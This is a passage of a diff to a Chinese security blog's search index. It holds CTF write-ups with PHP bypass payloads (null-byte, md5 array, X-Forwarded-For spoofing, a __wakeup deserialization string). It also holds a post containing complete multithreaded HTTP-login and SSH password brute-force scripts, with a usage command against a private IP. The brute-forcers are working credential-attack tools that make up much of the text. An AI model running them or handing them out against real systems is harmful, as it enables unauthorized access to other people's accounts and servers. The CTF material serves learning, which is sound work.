-<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
-<p>想到了intval()函数的作用，尝试id=1024.1</p>
-<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
-<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>])) &#123;
-       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)
-           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;
-       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)   
-           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
-       <span class="hljs-keyword">else</span>
-           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;
-   &#125;</code></pre>
 
-<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
-<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
-<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
-&#123;
-<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])
-<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
-<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
-<span class="hljs-keyword">else</span>
-<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;
-&#125; 
+<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
+<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
+&#125;
+?code=</code></pre>
+
+<hr>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
+<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
+&#125;
+&#125;
+<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
+<span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
 <span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
-<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
-<p>payload:</p>
-<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
-<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
-<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
+<p>输出结果</p>
+<pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
+<pre><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
 ]]></content>
       <categories>
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>md5</tag>
-        <tag>sql</tag>
-        <tag>代码审计</tag>
-        <tag>bypass</tag>
+        <tag>unserialize</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>python安全攻防</title>
+    <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
+    <content><![CDATA[<h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
+<blockquote>
+<p>passwords：密码字典 </p>
+<p>username:   账号字典</p>
+<p>result: 保存结果</p>
+<p>WeakPass.py :破解程序</p>
+</blockquote>
+<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-comment"># 对字典的分块大小</span>
+BLOCK_SIZE = <span class="hljs-number">1000</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>:</span>
+    url = <span class="hljs-string">&quot;http://127.0.0.1/homework/brute/login.php&quot;</span>
+
+    headers = &#123;
+            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 &#x27;</span>
+            <span class="hljs-string">&#x27;(KHTML, like Gecko) &#x27;</span>
+            <span class="hljs-string">&#x27;Chrome/19.0.1036.7 Safari/535.20&#x27;</span>
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, username, password</span>):</span>
+        self.username = username
+        self.password = password
+
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
+        data = &#123;
+            <span class="hljs-string">&#x27;username&#x27;</span>:username,
+            <span class="hljs-string">&#x27;password&#x27;</span>:password,
+            <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>
+        &#125;
+        print(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))
+        response = requests.post(self.url, data=data, headers=self.headers)
+
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login failed&#x27;</span> <span class="hljs-keyword">in</span> response.text:
+            <span class="hljs-keyword">pass</span>
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+            resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)
+            resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+            resultFile.close()
+            <span class="hljs-comment"># 程序终止，0表示正常退出</span>
+            <span class="hljs-comment"># os._exit(0) </span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.username:
+            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.password:
+                self.run(userItem, pwdItem)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BruteForceHttp</span>():</span>
+
+    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
+    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
+
+    <span class="hljs-comment"># 对密码和用户名进行分块处理</span>
+    blockUsername = partition(listUsername, BLOCK_SIZE)
+    blockPassword = partition(listPassword, BLOCK_SIZE)
+
+    threads = []
+    <span class="hljs-comment"># 将不同的密码子块分给不同的线程爆破</span>
+    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
+        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
+
+            work = ThreadWork(sonUserBlock, sonPwdBlock)
+            workThread = threading.Thread(target=work.start)
+
+            threads.append(workThread)
+
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.start()
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.join()
+
+<span class="hljs-comment"># 将密码和账号分块函数</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params">ls, size</span>):</span>
+    res = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ls), size):
+        res.append(ls[i: i+size])
+    <span class="hljs-keyword">return</span> res
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    time1 = time.time()
+    BruteForceHttp()
+    time2 = time.time()
+    print(time2-time1)</code></pre>
+
+<p>七十万条的数据跑了快十分钟，有点不可思议。。。可能是服务器的问题</p>
+<h1 id="多线程破解SSH密码"><a href="#多线程破解SSH密码" class="headerlink" title="多线程破解SSH密码"></a>多线程破解SSH密码</h1><blockquote>
+<p>passwords：密码字典 </p>
+<p>username:   账号字典</p>
+<p>result: 保存结果</p>
+<p>SSHattack:连接日志</p>
+<p>brute_SSH.py: 破解程序</p>
+</blockquote>
+<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-keyword">import</span> optparse
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> paramiko
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>(<span class="hljs-params">threading.Thread</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):</span>
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+        self.usernameBlock = usernameBlock
+        self.passwordBlock = passwordBlock
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
+        <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">        使用死循环</span>
+<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+            <span class="hljs-keyword">try</span>:
+                paramiko.util.log_to_file(<span class="hljs-string">&quot;SSHattack.log&quot;</span>)
+                ssh = paramiko.SSHClient()
+
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                sys.stdout.write(<span class="hljs-string">&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(username,password,self.port, self.ip))
+                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password)
+                ssh.close()
+                print(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))
+
+                resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../brutpass/result&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>)
+
+                resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+                resultFile.close()
+
+                os._exit(<span class="hljs-number">0</span>)
+            <span class="hljs-keyword">except</span> paramiko.ssh_exception.AuthenticationException <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">except</span> paramiko.ssh_exception.SSHException <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">break</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.usernameBlock:
+            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.passwordBlock:
+                self.run(userItem, pwdItem)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):</span>
+    step = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>) / num)
+    <span class="hljs-keyword">if</span> step == <span class="hljs-number">0</span>:
+        step = num
+    partition = [<span class="hljs-built_in">list</span>[i:i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>), step)]
+    <span class="hljs-keyword">return</span> partition
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):</span>
+    print(<span class="hljs-string">&quot;============爆破信息============&quot;</span>)
+    print(<span class="hljs-string">&quot;IP:&quot;</span> + ip)
+    print(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)
+    print(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)
+    print(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))
+    print(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)
+    print(<span class="hljs-string">&quot;=================================&quot;</span>)
+
+    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/username&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
+    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/passwords&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
+
+    <span class="hljs-comment"># 读取账号文件和密码文件并存入对应列表</span>
+    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(usernameFile)]
+    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(passwordFile)]
+    <span class="hljs-comment"># 账号列表和密码列表根据线程数量进行分块</span>
+    blockUsername = partition(listUsername, threadNumber)
+    blockPassword = partition(listPassword, threadNumber)
+    threads = []
+    <span class="hljs-comment"># 每个线程分配一个账号密码子块</span>
+    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
+        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
+            work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort)
+            <span class="hljs-comment"># 创建线程</span>
+            workThread = threading.Thread(target=work.start)
+            <span class="hljs-comment"># 在threads中加入线程</span>
+            threads.append(workThread)
+    <span class="hljs-comment"># 开始子线程</span>
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.start()
+    <span class="hljs-comment"># 阻塞主线程，等待所有子线程完成工作</span>
+    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
+        t.join()
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    parser = optparse.OptionParser(<span class="hljs-string">&#x27;usage: python %prog target [options] \n\n&#x27;</span>
+                                   <span class="hljs-string">&#x27;Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n&#x27;</span>)
+    <span class="hljs-comment"># 添加目标主机参数-i</span>
+    parser.add_option(<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ip&#x27;</span>, dest=<span class="hljs-string">&#x27;IP&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target IP&#x27;</span>)
+    <span class="hljs-comment"># 添加线程参数-t</span>
+    parser.add_option(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--threads&#x27;</span>, dest=<span class="hljs-string">&#x27;threadNum&#x27;</span>,
+                      default=<span class="hljs-number">10</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Number of threads [default = 10]&#x27;</span>)
+    <span class="hljs-comment"># 添加用户名文件参数-u</span>
+    parser.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--username&#x27;</span>, dest=<span class="hljs-string">&#x27;userName&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;./username&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;username file&#x27;</span>)
+    <span class="hljs-comment"># 添加密码文件参数-p</span>
+    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--password&#x27;</span>, dest=<span class="hljs-string">&#x27;passWord&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;./password&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;password file&#x27;</span>)
+    <span class="hljs-comment"># 添加SSH端口参数-P</span>
+    parser.add_option(<span class="hljs-string">&#x27;-P&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, dest=<span class="hljs-string">&#x27;port&#x27;</span>,
+                      default=<span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
+                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;ssh port&#x27;</span>)
+    (options, args) = parser.parse_args()
+
+    SshEXP(options.IP, options.userName, options.passWord, options.threadNum, options.port)
+</code></pre>
+
+<p>使用方法</p>
+<pre><code class="hljs stylus">python brute_SSH<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">164.166</span> -u ./username -<span class="hljs-selector-tag">p</span> ./passwords</code></pre>
+
+
+
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825163939574.png" alt="image-20210825163939574" style="zoom:80%;">
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
   </entry>
   <entry>
     <title>正则表达式</title>
@@ -2864,83 +3406,6 @@ sha1(&#x27;aa3OFF9m&#x27;)</code></pre>
       </categories>
   </entry>
   <entry>
-    <title>反序列化</title>
-    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<p>反序列化</p>
-<span id="more"></span>
-<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
-<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
-<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
-<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
-<p>举例说明</p>
-<pre><code>&lt;?php
-class Student&#123;
-public $full_name = &apos;zhangsan&apos;;
-public $score = 150;
-public $grades = array();
-
-function __wakeup() &#123;
-echo &quot;__wakeup is invoked&quot;;
-&#125;
-&#125;
-
-$s = new Student();
-var_dump(serialize($s));
-?&gt;</code></pre><hr>
-<pre><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code></pre><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
-<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
-<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
-<p>最后执行运行的代码如下:</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
-<span class="hljs-keyword">public</span> <span class="hljs-variable">$full_name</span> = <span class="hljs-string">&#x27;zhangsan&#x27;</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-variable">$score</span> = <span class="hljs-number">150</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-variable">$grades</span> = <span class="hljs-keyword">array</span>();
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup is invoked&quot;</span>;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
-var_dump(<span class="hljs-keyword">$this</span>);
-&#125;
-&#125;
-
-<span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Student();
-<span class="hljs-variable">$stu</span> = unserialize(<span class="hljs-string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-
-<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
-<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
-<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
-<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
-&#125;
-?code=</code></pre>
-
-<hr>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
-<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
-<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
-&#125;
-&#125;
-<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
-<span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
-<span class="hljs-meta">?&gt;</span></code></pre>
-<p>输出结果</p>
-<pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
-<pre><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>unserialize</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>rce</title>
     <url>/2020/11/29/rce/</url>
     <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
@@ -3047,235 +3512,6 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
       <tags>
         <tag>cmd</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>python安全攻防</title>
-    <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
-    <content><![CDATA[<h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
-<blockquote>
-<p>passwords：密码字典 </p>
-<p>username:   账号字典</p>
-<p>result: 保存结果</p>
-<p>WeakPass.py :破解程序</p>
-</blockquote>
-<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-keyword">import</span> threading
-<span class="hljs-keyword">import</span> os
-<span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
-
-<span class="hljs-comment"># 对字典的分块大小</span>
-BLOCK_SIZE = <span class="hljs-number">1000</span>
-
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>:</span>
-    url = <span class="hljs-string">&quot;http://127.0.0.1/homework/brute/login.php&quot;</span>
-
-    headers = &#123;
-            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 &#x27;</span>
-            <span class="hljs-string">&#x27;(KHTML, like Gecko) &#x27;</span>
-            <span class="hljs-string">&#x27;Chrome/19.0.1036.7 Safari/535.20&#x27;</span>
-    &#125;
-
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, username, password</span>):</span>
